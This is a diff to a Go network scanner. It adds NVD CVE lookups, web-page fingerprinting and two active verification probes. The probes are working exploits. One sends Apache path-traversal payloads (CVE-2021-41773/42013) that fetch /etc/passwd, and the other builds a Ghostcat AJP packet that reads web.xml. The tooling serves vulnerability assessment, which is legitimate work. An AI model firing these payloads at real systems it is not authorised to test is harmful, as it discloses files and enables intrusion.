@@ -43,6 +43,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/csv"
 	"encoding/json"
 	"flag"
@@ -51,10 +52,12 @@ import (
 	"io/ioutil"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 
 	//"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -77,6 +80,7 @@ type BannerResult struct {
 	CertIssuer  string   `json:"cert_issuer,omitempty"`
 	CertCN      string   `json:"cert_cn,omitempty"`
 	Vulns       []string `json:"vulnerabilities,omitempty"`
+	NVDVulns    []string `json:"nvd_vulnerabilities,omitempty"`
 	Exploits    []string `json:"exploits,omitempty"`
 	Enum        []string `json:"enumeration,omitempty"`
 	Brute       []string `json:"bruteforce,omitempty"`
@@ -416,11 +420,711 @@ func checkVulnerabilities(host, port, protocol, banner string) []string {
 		vulns = append(vulns, "Log4Shell vulnerability detected by active probe!")
 	}
 
+	// Active per-CVE verification probes: only fire when the corresponding
+	// CVE was already flagged from the banner above (never probe every
+	// target for every CVE unconditionally), and only tag a result
+	// "(confirmed via active probe)" on an actual successful probe - a
+	// failed/inconclusive probe leaves the original version-match finding
+	// exactly as it was, never silently upgraded or removed.
+	if protocol == "http" {
+		hasApacheTraversalCandidate := false
+		for _, v := range vulns {
+			if strings.Contains(v, "CVE-2021-41773") || strings.Contains(v, "CVE-2021-42013") {
+				hasApacheTraversalCandidate = true
+				break
+			}
+		}
+		if hasApacheTraversalCandidate {
+			nvdDebugf("probe: Apache path traversal candidate found for %s:%s, firing probeApachePathTraversal", host, port)
+			if probeApachePathTraversal(host, port) {
+				nvdDebugf("probe: Apache path traversal CONFIRMED for %s:%s", host, port)
+				for i, v := range vulns {
+					if strings.Contains(v, "CVE-2021-41773") || strings.Contains(v, "CVE-2021-42013") {
+						vulns[i] = v + " (confirmed via active probe)"
+					}
+				}
+			} else {
+				nvdDebugf("probe: Apache path traversal NOT confirmed for %s:%s (banner version match only)", host, port)
+			}
+		}
+
+		hasGhostcatCandidate := false
+		for _, v := range vulns {
+			if strings.Contains(v, "CVE-2020-1938") {
+				hasGhostcatCandidate = true
+				break
+			}
+		}
+		if hasGhostcatCandidate {
+			const defaultAJPPort = "8009" // Tomcat's standard AJP connector port; Ghostcat only affects AJP, not the HTTP port the banner came from
+			nvdDebugf("probe: Ghostcat candidate found for %s, firing probeGhostcat against AJP port %s", host, defaultAJPPort)
+			if probeGhostcat(host, defaultAJPPort) {
+				nvdDebugf("probe: Ghostcat CONFIRMED for %s:%s", host, defaultAJPPort)
+				for i, v := range vulns {
+					if strings.Contains(v, "CVE-2020-1938") {
+						vulns[i] = v + " (confirmed via active probe)"
+					}
+				}
+			} else {
+				nvdDebugf("probe: Ghostcat NOT confirmed for %s:%s (AJP connector unreachable or not vulnerable)", host, defaultAJPPort)
+			}
+		}
+	}
+
 	// CVE/Exploit DB Integration
 	cveMatches := matchCVEs(banner)
 	vulns = append(vulns, cveMatches...)
 
 	return vulns
+}
+
+// NVD CVE API Integration (NVD_API_KEY based)
+// Loads NVD_API_KEY from the environment (or a local .env file) and queries
+// the official NVD CVE API 2.0 for CVEs matching the detected banner. This is
+// additive to checkVulnerabilities/matchCVEs above and does not replace them.
+
+var (
+	nvdRateLimiter = time.NewTicker(650 * time.Millisecond) // ~50 req/30s (NVD API key rate limit)
+	nvdRawCache    sync.Map                                 // cache key -> *nvdCVEResponse (raw decoded NVD responses)
+)
+
+const nvdAPIEndpoint = "https://services.nvd.nist.gov/rest/json/cves/2.0"
+
+// nvdCPEMatch mirrors one entry of a CVE's
+// configurations[].nodes[].cpeMatch[] block - the structured data NVD uses
+// to say exactly which CPE (and, often, which version range of it) a CVE
+// applies to. versionStart/End fields are only present when the CVE applies
+// to a range rather than a single exact version.
+type nvdCPEMatch struct {
+	Vulnerable            bool   `json:"vulnerable"`
+	Criteria              string `json:"criteria"`
+	VersionStartIncluding string `json:"versionStartIncluding"`
+	VersionStartExcluding string `json:"versionStartExcluding"`
+	VersionEndIncluding   string `json:"versionEndIncluding"`
+	VersionEndExcluding   string `json:"versionEndExcluding"`
+}
+
+type nvdConfigNode struct {
+	CPEMatch []nvdCPEMatch `json:"cpeMatch"`
+}
+
+type nvdConfiguration struct {
+	Nodes []nvdConfigNode `json:"nodes"`
+}
+
+type nvdCVE struct {
+	ID           string `json:"id"`
+	Descriptions []struct {
+		Lang  string `json:"lang"`
+		Value string `json:"value"`
+	} `json:"descriptions"`
+	Metrics struct {
+		CvssMetricV31 []struct {
+			CvssData struct {
+				BaseScore    float64 `json:"baseScore"`
+				BaseSeverity string  `json:"baseSeverity"`
+			} `json:"cvssData"`
+		} `json:"cvssMetricV31"`
+		CvssMetricV2 []struct {
+			CvssData struct {
+				BaseScore float64 `json:"baseScore"`
+			} `json:"cvssData"`
+			BaseSeverity string `json:"baseSeverity"`
+		} `json:"cvssMetricV2"`
+	} `json:"metrics"`
+	Configurations []nvdConfiguration `json:"configurations"`
+}
+
+type nvdCVEResponse struct {
+	Vulnerabilities []struct {
+		CVE nvdCVE `json:"cve"`
+	} `json:"vulnerabilities"`
+}
+
+// loadDotEnv reads KEY=VALUE pairs from a .env file into the process
+// environment. Existing environment variables always take precedence.
+func loadDotEnv(path string) {
+	f, err := os.Open(path)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		line = strings.TrimPrefix(line, "export ")
+		parts := strings.SplitN(line, "=", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		key := strings.TrimSpace(parts[0])
+		val := strings.Trim(strings.TrimSpace(parts[1]), `"'`)
+		if _, exists := os.LookupEnv(key); !exists {
+			os.Setenv(key, val)
+		}
+	}
+}
+
+var (
+	nvdHTTPStatusLineRe = regexp.MustCompile(`(?i)^https?/\d`)
+	nvdHeaderRe         = regexp.MustCompile(`(?im)^(server|x-powered-by|powered-by)\s*:\s*(.+)\r?$`)
+	nvdProductVersionRe = regexp.MustCompile(`([A-Za-z][A-Za-z0-9_.\-]{1,30})[/\s]+v?([0-9]+(?:\.[0-9]+){1,3})`)
+)
+
+// nvdDebugf prints NVD lookup diagnostics to stderr when NVD_DEBUG is set
+// (e.g. "export NVD_DEBUG=1" or an NVD_DEBUG=1 line in .env). Silent
+// otherwise, so normal scans stay clean.
+func nvdDebugf(format string, args ...interface{}) {
+	if os.Getenv("NVD_DEBUG") == "" {
+		return
+	}
+	fmt.Fprintf(os.Stderr, "[NVD DEBUG] "+format+"\n", args...)
+}
+
+// nvdProductAliases expands a product name pulled from a banner into the
+// alternate names NVD's free-text keywordSearch is more likely to match
+// against (NVD descriptions rarely use vendor-prefixed banner strings
+// verbatim - e.g. a banner says "Microsoft-IIS" but CVE descriptions say
+// "IIS" or "Internet Information Services").
+func nvdProductAliases(product string) []string {
+	variants := []string{product}
+	if idx := strings.LastIndex(product, "-"); idx > 0 {
+		variants = append(variants, product[idx+1:], strings.ReplaceAll(product, "-", " "))
+	}
+	if strings.Contains(strings.ToLower(product), "iis") {
+		variants = append(variants, "Internet Information Services")
+	}
+	return variants
+}
+
+// nvdCPEProductMap maps a lowercased "Server"/"X-Powered-By" product token to
+// its official NVD CPE 2.3 "vendor:product" pair, for the products this tool
+// already fingerprints in checkVulnerabilities/matchCVEs above. cpeName
+// lookups against these are far more precise than free-text keywordSearch,
+// since they match NVD's structured CPE data instead of description text.
+var nvdCPEProductMap = map[string]string{
+	"apache":        "apache:http_server",
+	"nginx":         "nginx:nginx",
+	"microsoft-iis": "microsoft:internet_information_services",
+	"iis":           "microsoft:internet_information_services",
+	"openssh":       "openbsd:openssh",
+	"php":           "php:php",
+	"apache-coyote": "apache:tomcat",
+	"tomcat":        "apache:tomcat",
+	"apache tomcat": "apache:tomcat",
+	"proftpd":       "proftpd:proftpd",
+	"exim":          "exim:exim",
+	// Content-fingerprinted products (see fetchContentCandidates below) -
+	// these aren't identifiable from headers alone, only from page content.
+	"wordpress":  "wordpress:wordpress",
+	"phpmyadmin": "phpmyadmin:phpmyadmin",
+	"django":     "djangoproject:django",
+}
+
+// buildCPEName constructs an NVD CPE 2.3 match string (e.g.
+// "cpe:2.3:a:microsoft:internet_information_services:8.5:*:*:*:*:*:*:*") for
+// a product/version pulled from a banner, using nvdCPEProductMap. Also
+// returns the raw "vendor:product" pair so callers can cross-check returned
+// CVEs' configurations against it. Returns ok=false when the product isn't
+// in the curated map.
+func buildCPEName(product, version string) (cpeName, vendorProduct string, ok bool) {
+	vp, found := nvdCPEProductMap[strings.ToLower(strings.TrimSpace(product))]
+	if !found || version == "" {
+		return "", "", false
+	}
+	return fmt.Sprintf("cpe:2.3:a:%s:%s:*:*:*:*:*:*:*", vp, version), vp, true
+}
+
+type nvdCandidate struct {
+	Product string
+	Version string
+}
+
+// extractNVDCandidates pulls "product version" pairs out of a banner's
+// Server / X-Powered-By / Powered-By headers (e.g. "X-Powered-By: PHP/7.2.1"
+// or "Server: Microsoft-IIS/8.5"), which identify the actual product/version
+// - unlike the leading "HTTP/1.1 200 OK" status line, which is deliberately
+// skipped. Falls back to a generic scan of the banner for protocols without
+// headers (ssh, ftp, smtp, ...).
+func extractNVDCandidates(banner string) []nvdCandidate {
+	var candidates []nvdCandidate
+	seen := make(map[string]bool)
+	addCandidate := func(product, version string) {
+		key := strings.ToLower(product) + "/" + version
+		if product == "" || seen[key] {
+			return
+		}
+		seen[key] = true
+		candidates = append(candidates, nvdCandidate{Product: product, Version: version})
+	}
+
+	for _, m := range nvdHeaderRe.FindAllStringSubmatch(banner, -1) {
+		value := strings.TrimSpace(m[2])
+		if vm := nvdProductVersionRe.FindStringSubmatch(value); vm != nil {
+			addCandidate(vm[1], vm[2])
+		} else if value != "" {
+			addCandidate(value, "")
+		}
+	}
+
+	if len(candidates) == 0 {
+		for _, line := range strings.Split(banner, "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" || nvdHTTPStatusLineRe.MatchString(line) {
+				continue
+			}
+			if vm := nvdProductVersionRe.FindStringSubmatch(line); vm != nil {
+				addCandidate(vm[1], vm[2])
+				break
+			}
+		}
+	}
+
+	if len(candidates) == 0 {
+		for _, line := range strings.Split(banner, "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" || nvdHTTPStatusLineRe.MatchString(line) {
+				continue
+			}
+			if len(line) > 60 {
+				line = line[:60]
+			}
+			addCandidate(line, "")
+			break
+		}
+	}
+
+	return candidates
+}
+
+var (
+	nvdMetaGeneratorRe  = regexp.MustCompile(`(?i)<meta\s+name=["']generator["']\s+content=["']([^"']+)["']`)
+	nvdWPVersionedAsset = regexp.MustCompile(`(?i)(?:wp-content|wp-includes)/[^"'?]+\?ver=([0-9]+(?:\.[0-9]+){1,3})`)
+	nvdTomcatDefaultRe  = regexp.MustCompile(`(?i)Apache Tomcat/([0-9]+(?:\.[0-9]+){1,3})`)
+	nvdDjangoVersionRe  = regexp.MustCompile(`(?i)Django Version:\s*([0-9]+(?:\.[0-9]+){1,3})`)
+	nvdPHPMyAdminVerRe  = regexp.MustCompile(`(?i)phpMyAdmin\s+([0-9]+(?:\.[0-9]+){1,3})`)
+)
+
+// fetchContentCandidates performs a small number of targeted, read-only GET
+// requests against common default/error pages and inspects the response
+// bodies for product/version signals a raw banner alone can't reveal: a
+// <meta name="generator"> tag, versioned static asset paths
+// (wp-content/...?ver=X.Y.Z), Tomcat's default error page (which often
+// discloses its exact version even when the Server header doesn't), and
+// WordPress / phpMyAdmin / Django's own default pages. This is capped at
+// four fixed, well-known paths - it does not crawl the site or maintain a
+// signature database.
+func fetchContentCandidates(host, port, protocol string) []nvdCandidate {
+	if protocol != "http" && protocol != "https" {
+		return nil
+	}
+
+	var candidates []nvdCandidate
+	seen := make(map[string]bool)
+	addCandidate := func(product, version string) {
+		key := strings.ToLower(product) + "/" + version
+		if product == "" || seen[key] {
+			return
+		}
+		seen[key] = true
+		candidates = append(candidates, nvdCandidate{Product: product, Version: version})
+		nvdDebugf("content fingerprint: product=%q version=%q", product, version)
+	}
+
+	client := &http.Client{Timeout: 3 * time.Second}
+	fetch := func(path string) (int, string) {
+		reqURL := fmt.Sprintf("%s://%s:%s%s", protocol, host, port, path)
+		req, err := http.NewRequest("GET", reqURL, nil)
+		if err != nil {
+			return 0, ""
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			nvdDebugf("content fingerprint: GET %s error: %v", reqURL, err)
+			return 0, ""
+		}
+		defer resp.Body.Close()
+		buf := make([]byte, 65536)
+		n, _ := resp.Body.Read(buf)
+		return resp.StatusCode, string(buf[:n])
+	}
+
+	// 1. Root page: <meta name="generator"> tag and WordPress versioned assets.
+	if _, body := fetch("/"); body != "" {
+		if m := nvdMetaGeneratorRe.FindStringSubmatch(body); m != nil {
+			if vm := nvdProductVersionRe.FindStringSubmatch(m[1]); vm != nil {
+				addCandidate(vm[1], vm[2])
+			} else {
+				addCandidate(strings.TrimSpace(m[1]), "")
+			}
+		}
+		if m := nvdWPVersionedAsset.FindStringSubmatch(body); m != nil {
+			addCandidate("WordPress", m[1])
+		}
+	}
+
+	// 2. WordPress's login page - confirms WordPress even with no version signal.
+	if status, body := fetch("/wp-login.php"); status == 200 && (strings.Contains(body, "wp-login") || strings.Contains(body, "WordPress")) {
+		addCandidate("WordPress", "")
+	}
+
+	// 3. phpMyAdmin's login page, which often shows its version in the footer.
+	if status, body := fetch("/phpmyadmin/"); status == 200 && (strings.Contains(body, "pma_username") || strings.Contains(strings.ToLower(body), "phpmyadmin")) {
+		if m := nvdPHPMyAdminVerRe.FindStringSubmatch(body); m != nil {
+			addCandidate("phpMyAdmin", m[1])
+		} else {
+			addCandidate("phpMyAdmin", "")
+		}
+	}
+
+	// 4. A deliberately nonexistent path: Tomcat's default 404 page often
+	// discloses its exact version; Django's default 404/debug page can too.
+	if _, body := fetch("/bannergrap-nonexistent-check-Z9x7"); body != "" {
+		if m := nvdTomcatDefaultRe.FindStringSubmatch(body); m != nil {
+			addCandidate("Apache Tomcat", m[1])
+		}
+		if m := nvdDjangoVersionRe.FindStringSubmatch(body); m != nil {
+			addCandidate("Django", m[1])
+		} else if strings.Contains(body, "Django") && strings.Contains(body, "Page not found") {
+			addCandidate("Django", "")
+		}
+	}
+
+	return candidates
+}
+
+var nvdVersionDigitRe = regexp.MustCompile(`\d+`)
+
+// parseVersionParts splits a dotted version string like "2.4.49" into
+// numeric components ([2,4,49]) for ordered comparison. Non-digit
+// characters within a component are ignored (e.g. "8.5" and "8.5rc1" both
+// yield a usable numeric component), which is a deliberate simplification.
+func parseVersionParts(v string) []int {
+	fields := strings.Split(v, ".")
+	parts := make([]int, len(fields))
+	for i, f := range fields {
+		n, _ := strconv.Atoi(nvdVersionDigitRe.FindString(f))
+		parts[i] = n
+	}
+	return parts
+}
+
+// compareVersions compares two dotted version strings numerically component
+// by component, returning -1, 0, or 1 (like strings.Compare).
+func compareVersions(a, b string) int {
+	pa, pb := parseVersionParts(a), parseVersionParts(b)
+	for i := 0; i < len(pa) || i < len(pb); i++ {
+		var x, y int
+		if i < len(pa) {
+			x = pa[i]
+		}
+		if i < len(pb) {
+			y = pb[i]
+		}
+		if x != y {
+			if x < y {
+				return -1
+			}
+			return 1
+		}
+	}
+	return 0
+}
+
+// versionInRange reports whether version falls within the bounds described
+// by a cpeMatch entry's versionStart/End fields. An empty bound is
+// unbounded on that side.
+func versionInRange(version, startIncl, startExcl, endIncl, endExcl string) bool {
+	if startIncl != "" && compareVersions(version, startIncl) < 0 {
+		return false
+	}
+	if startExcl != "" && compareVersions(version, startExcl) <= 0 {
+		return false
+	}
+	if endIncl != "" && compareVersions(version, endIncl) > 0 {
+		return false
+	}
+	if endExcl != "" && compareVersions(version, endExcl) >= 0 {
+		return false
+	}
+	return true
+}
+
+// nvdVersionVerdict describes what a CVE's configurations data says about
+// whether the detected version is actually affected.
+type nvdVersionVerdict int
+
+const (
+	// nvdVerdictUnknown: no configuration data for this vendor:product was
+	// found, so there's nothing to cross-check against (e.g. an older CVE
+	// record with sparse configurations data).
+	nvdVerdictUnknown nvdVersionVerdict = iota
+	// nvdVerdictMatch: the detected version falls within an affected
+	// range, or matches an exact-version CPE entry.
+	nvdVerdictMatch
+	// nvdVerdictNoMatch: configuration data for this vendor:product exists,
+	// but the detected version falls outside every range/exact match found.
+	nvdVerdictNoMatch
+)
+
+// nvdCheckVersionRange inspects a CVE's configurations block for CPE match
+// entries belonging to vendorProduct ("vendor:product", e.g.
+// "apache:http_server") and determines whether version is covered.
+func nvdCheckVersionRange(cve *nvdCVE, vendorProduct, version string) nvdVersionVerdict {
+	if vendorProduct == "" || version == "" {
+		return nvdVerdictUnknown
+	}
+	prefix := "cpe:2.3:a:" + vendorProduct + ":"
+	found := false
+	for _, cfg := range cve.Configurations {
+		for _, node := range cfg.Nodes {
+			for _, m := range node.CPEMatch {
+				if !m.Vulnerable || !strings.HasPrefix(m.Criteria, prefix) {
+					continue
+				}
+				found = true
+				if m.VersionStartIncluding == "" && m.VersionStartExcluding == "" &&
+					m.VersionEndIncluding == "" && m.VersionEndExcluding == "" {
+					// No explicit range: the criteria string itself encodes
+					// the version (or a wildcard covering all versions).
+					fields := strings.Split(m.Criteria, ":")
+					if len(fields) > 5 {
+						critVersion := fields[5]
+						if critVersion == "*" || critVersion == "-" || compareVersions(version, critVersion) == 0 {
+							return nvdVerdictMatch
+						}
+					}
+					continue
+				}
+				if versionInRange(version, m.VersionStartIncluding, m.VersionStartExcluding, m.VersionEndIncluding, m.VersionEndExcluding) {
+					return nvdVerdictMatch
+				}
+			}
+		}
+	}
+	if found {
+		return nvdVerdictNoMatch
+	}
+	return nvdVerdictUnknown
+}
+
+// nvdResult pairs a formatted, human-readable CVE entry with its bare CVE ID
+// (used for de-duplication independent of the confidence tag/formatting).
+type nvdResult struct {
+	ID    string
+	Entry string
+}
+
+// nvdFormatEntry renders a CVE as "[TAG] CVE-ID [SEVERITY score]:
+// description", where TAG is "VERIFIED" (confirmed via NVD's structured CPE
+// version-range data) or "UNVERIFIED" (a free-text keywordSearch hit that
+// could not be cross-checked against a specific version range).
+func nvdFormatEntry(cve *nvdCVE, tag string) nvdResult {
+	desc := ""
+	for _, d := range cve.Descriptions {
+		if d.Lang == "en" {
+			desc = d.Value
+			break
+		}
+	}
+	if len(desc) > 150 {
+		desc = desc[:150] + "..."
+	}
+
+	severity := ""
+	score := 0.0
+	if len(cve.Metrics.CvssMetricV31) > 0 {
+		severity = cve.Metrics.CvssMetricV31[0].CvssData.BaseSeverity
+		score = cve.Metrics.CvssMetricV31[0].CvssData.BaseScore
+	} else if len(cve.Metrics.CvssMetricV2) > 0 {
+		severity = cve.Metrics.CvssMetricV2[0].BaseSeverity
+		score = cve.Metrics.CvssMetricV2[0].CvssData.BaseScore
+	}
+
+	entry := fmt.Sprintf("[%s] %s", tag, cve.ID)
+	if severity != "" {
+		entry += fmt.Sprintf(" [%s %.1f]", severity, score)
+	}
+	if desc != "" {
+		entry += ": " + desc
+	}
+	return nvdResult{ID: cve.ID, Entry: entry}
+}
+
+// nvdFetchRaw performs a single rate-limited, cached GET against the NVD CVE
+// API 2.0 and returns the decoded response, or nil on any failure. cacheKey
+// identifies this lookup for the in-memory raw-response cache.
+func nvdFetchRaw(cacheKey string, params url.Values, apiKey string) *nvdCVEResponse {
+	if cached, ok := nvdRawCache.Load(cacheKey); ok {
+		nvdDebugf("cache_key=%q served from cache", cacheKey)
+		return cached.(*nvdCVEResponse)
+	}
+
+	<-nvdRateLimiter.C
+
+	reqURL := nvdAPIEndpoint + "?" + params.Encode()
+	nvdDebugf("requesting cache_key=%q url=%s", cacheKey, reqURL)
+
+	req, err := http.NewRequest("GET", reqURL, nil)
+	if err != nil {
+		nvdDebugf("cache_key=%q request build error: %v", cacheKey, err)
+		return nil
+	}
+	req.Header.Set("apiKey", apiKey)
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		nvdDebugf("cache_key=%q http request error: %v", cacheKey, err)
+		return nil
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		nvdDebugf("cache_key=%q body read error: %v", cacheKey, err)
+		return nil
+	}
+
+	if resp.StatusCode != http.StatusOK {
+		snippet := string(body)
+		if len(snippet) > 300 {
+			snippet = snippet[:300]
+		}
+		nvdDebugf("cache_key=%q non-200 status %d: %s", cacheKey, resp.StatusCode, snippet)
+		return nil
+	}
+
+	var parsed nvdCVEResponse
+	if err := json.Unmarshal(body, &parsed); err != nil {
+		nvdDebugf("cache_key=%q json unmarshal error: %v", cacheKey, err)
+		return nil
+	}
+	nvdDebugf("cache_key=%q NVD returned %d vulnerabilities", cacheKey, len(parsed.Vulnerabilities))
+
+	nvdRawCache.Store(cacheKey, &parsed)
+	return &parsed
+}
+
+// queryNVDByCPE looks up a precise CPE 2.3 match string against NVD, then
+// cross-checks each returned CVE's configurations against vendorProduct and
+// version. Entries confirmed in-range are tagged VERIFIED; entries whose
+// configuration data proves the version is NOT affected are dropped
+// entirely (this is what fixes the false positives the plain exact-cpeName
+// query alone could still let through).
+func queryNVDByCPE(cpeName, vendorProduct, version, apiKey string) []nvdResult {
+	q := url.Values{}
+	q.Set("cpeName", cpeName)
+	q.Set("resultsPerPage", "5")
+	parsed := nvdFetchRaw("cpe:"+cpeName, q, apiKey)
+	if parsed == nil {
+		return nil
+	}
+
+	var results []nvdResult
+	for i := range parsed.Vulnerabilities {
+		cve := &parsed.Vulnerabilities[i].CVE
+		switch nvdCheckVersionRange(cve, vendorProduct, version) {
+		case nvdVerdictNoMatch:
+			nvdDebugf("cpe=%q cve=%s dropped: version %s outside matched range", cpeName, cve.ID, version)
+		default: // Match, or Unknown (no config data to contradict the exact cpeName hit) - trust it.
+			results = append(results, nvdFormatEntry(cve, "VERIFIED"))
+		}
+	}
+	return results
+}
+
+// queryNVDByKeyword looks up a free-text keyword term against NVD. Unlike
+// queryNVDByCPE, a keyword hit is not tied to a specific CPE, so it cannot
+// be cross-checked against a version range - every result is tagged
+// UNVERIFIED rather than silently treated as confirmed.
+func queryNVDByKeyword(term, apiKey string) []nvdResult {
+	q := url.Values{}
+	q.Set("keywordSearch", term)
+	q.Set("resultsPerPage", "5")
+	parsed := nvdFetchRaw("kw:"+term, q, apiKey)
+	if parsed == nil {
+		return nil
+	}
+
+	var results []nvdResult
+	for i := range parsed.Vulnerabilities {
+		cve := &parsed.Vulnerabilities[i].CVE
+		results = append(results, nvdFormatEntry(cve, "UNVERIFIED"))
+	}
+	return results
+}
+
+// checkVulnerabilitiesNVD queries the NVD CVE API 2.0 using NVD_API_KEY. For
+// each product/version pulled from the banner's headers, plus a handful of
+// content-based fingerprints (see fetchContentCandidates: meta generator
+// tags, default/error pages, versioned asset paths), it first tries a
+// precise, version-range-verified CPE match (when the product is in
+// nvdCPEProductMap), then falls back to free-text keywordSearch variants
+// (including common aliases, e.g. "Microsoft-IIS" -> "IIS" / "Internet
+// Information Services") tagged UNVERIFIED. Returns the merged,
+// de-duplicated CVE entries, or nil (silently, feature disabled) when no
+// NVD_API_KEY is configured.
+func checkVulnerabilitiesNVD(host, port, protocol, banner string) []string {
+	apiKey := os.Getenv("NVD_API_KEY")
+	if apiKey == "" {
+		nvdDebugf("NVD_API_KEY not set - skipping NVD lookup")
+		return nil
+	}
+
+	candidates := extractNVDCandidates(banner)
+	seenCandidate := make(map[string]bool)
+	for _, c := range candidates {
+		seenCandidate[strings.ToLower(c.Product)+"/"+c.Version] = true
+	}
+	for _, c := range fetchContentCandidates(host, port, protocol) {
+		key := strings.ToLower(c.Product) + "/" + c.Version
+		if seenCandidate[key] {
+			continue
+		}
+		seenCandidate[key] = true
+		candidates = append(candidates, c)
+	}
+
+	if len(candidates) == 0 {
+		nvdDebugf("no NVD search candidates extracted from banner or content fingerprinting")
+		return nil
+	}
+	nvdDebugf("candidates: %+v", candidates)
+
+	var all []string
+	seenCVE := make(map[string]bool)
+	addEntries := func(entries []nvdResult) {
+		for _, r := range entries {
+			if seenCVE[r.ID] {
+				continue
+			}
+			seenCVE[r.ID] = true
+			all = append(all, r.Entry)
+		}
+	}
+
+	for _, c := range candidates {
+		if len(all) >= 10 {
+			break
+		}
+		if cpeName, vendorProduct, ok := buildCPEName(c.Product, c.Version); ok {
+			addEntries(queryNVDByCPE(cpeName, vendorProduct, c.Version, apiKey))
+		}
+		if c.Version == "" {
+			addEntries(queryNVDByKeyword(c.Product, apiKey))
+			continue
+		}
+		for _, alias := range nvdProductAliases(c.Product) {
+			addEntries(queryNVDByKeyword(alias+" "+c.Version, apiKey))
+		}
+	}
+	nvdDebugf("total merged CVEs found: %d", len(all))
+	return all
 }
 
 // Active Probes
@@ -481,6 +1185,123 @@ func probeLog4Shell(host, port string) bool {
 	buf := new(bytes.Buffer)
 	buf.ReadFrom(resp.Body)
 	return bytes.Contains(buf.Bytes(), []byte("log4shell"))
+}
+
+// probeApachePathTraversal actively verifies CVE-2021-41773 / CVE-2021-42013
+// (Apache HTTP Server path traversal / RCE via mod_cgi encoded dot-segments)
+// by requesting a well-known file through the published traversal payloads
+// and checking whether the RAW FILE CONTENT actually comes back - not just
+// that the Apache version string in the banner matches, which is all
+// checkVulnerabilities alone can tell. Non-destructive (read-only GET),
+// timeout-bounded like the other probes in this section.
+func probeApachePathTraversal(host, port string) bool {
+	paths := []string{
+		"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+		"/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+	}
+	client := &http.Client{Timeout: 3 * time.Second}
+	for _, p := range paths {
+		reqURL := fmt.Sprintf("http://%s:%s%s", host, port, p)
+		req, err := http.NewRequest("GET", reqURL, nil)
+		if err != nil {
+			continue
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		buf := new(bytes.Buffer)
+		buf.ReadFrom(resp.Body)
+		resp.Body.Close()
+		body := buf.String()
+		if resp.StatusCode == 200 && strings.Contains(body, "root:") && strings.Contains(body, ":0:0:") {
+			return true
+		}
+	}
+	return false
+}
+
+// ajpPackString encodes a string in AJP13's length-prefixed, null-terminated
+// wire format. An empty string is encoded as AJP13's "null string" marker
+// (0xFFFF) rather than a zero-length string, per the AJP13 protocol spec.
+func ajpPackString(s string) []byte {
+	if s == "" {
+		return []byte{0xFF, 0xFF}
+	}
+	buf := new(bytes.Buffer)
+	binary.Write(buf, binary.BigEndian, uint16(len(s)))
+	buf.WriteString(s)
+	buf.WriteByte(0)
+	return buf.Bytes()
+}
+
+// buildGhostcatProbePacket builds an AJP13 "Forward Request" packet asking
+// Tomcat's AJP connector to include (read) targetFile via the
+// javax.servlet.include.* request attributes - the technique behind
+// CVE-2020-1938 (Ghostcat) arbitrary file read/disclosure.
+func buildGhostcatProbePacket(targetFile string) []byte {
+	body := new(bytes.Buffer)
+	body.WriteByte(0x02) // JK_AJP13_FORWARD_REQUEST
+	body.WriteByte(0x02) // method: GET
+	body.Write(ajpPackString("HTTP/1.1"))
+	body.Write(ajpPackString("/"))
+	body.Write(ajpPackString("127.0.0.1"))
+	body.Write([]byte{0xFF, 0xFF}) // remote host: null
+	body.Write(ajpPackString("localhost"))
+	binary.Write(body, binary.BigEndian, uint16(80)) // server port
+	body.WriteByte(0)                                // is_ssl: false
+	binary.Write(body, binary.BigEndian, uint16(0))  // num headers: 0
+
+	writeAttr := func(name, value string) {
+		body.WriteByte(0x0A) // req_attribute
+		body.Write(ajpPackString(name))
+		body.Write(ajpPackString(value))
+	}
+	writeAttr("javax.servlet.include.request_uri", "/")
+	writeAttr("javax.servlet.include.path_info", targetFile)
+	writeAttr("javax.servlet.include.servlet_path", "/")
+	body.WriteByte(0xFF) // request terminator
+
+	packet := new(bytes.Buffer)
+	packet.Write([]byte{0x12, 0x34}) // AJP13 client->container magic
+	binary.Write(packet, binary.BigEndian, uint16(body.Len()))
+	packet.Write(body.Bytes())
+	return packet.Bytes()
+}
+
+// probeGhostcat actively verifies CVE-2020-1938 (Ghostcat) by sending a
+// crafted AJP13 Forward Request to Tomcat's AJP connector asking it to
+// include WEB-INF/web.xml, then checking whether the response actually
+// contains file content rather than an AJP error. Non-destructive
+// (read-only), timeout-bounded. ajpPort is normally Tomcat's standard AJP
+// connector port (8009) - Ghostcat only affects the AJP connector, which is
+// virtually always a different port than the HTTP connector whose banner
+// triggered this probe, so callers should not reuse the HTTP port here.
+func probeGhostcat(host, ajpPort string) bool {
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, ajpPort), 3*time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(3 * time.Second))
+
+	if _, err := conn.Write(buildGhostcatProbePacket("/WEB-INF/web.xml")); err != nil {
+		return false
+	}
+
+	buf := make([]byte, 8192)
+	n, err := conn.Read(buf)
+	if err != nil || n < 5 {
+		return false
+	}
+	resp := buf[:n]
+	// AJP13 container->server magic (0x41 0x42 = "AB") with prefix code
+	// 0x03 (SEND_BODY_CHUNK) means Tomcat sent back body data - confirm it
+	// actually looks like the requested web.xml, not an error page.
+	if resp[0] == 0x41 && resp[1] == 0x42 && resp[4] == 0x03 {
+		return bytes.Contains(resp, []byte("<?xml")) || bytes.Contains(resp, []byte("<web-app"))
+	}
+	return false
 }
 
 // CVE/Exploit DB Integration_Regex Matching
@@ -775,6 +1596,9 @@ func generateReport(r BannerResult) string {
 		if len(r.Vulns) > 0 {
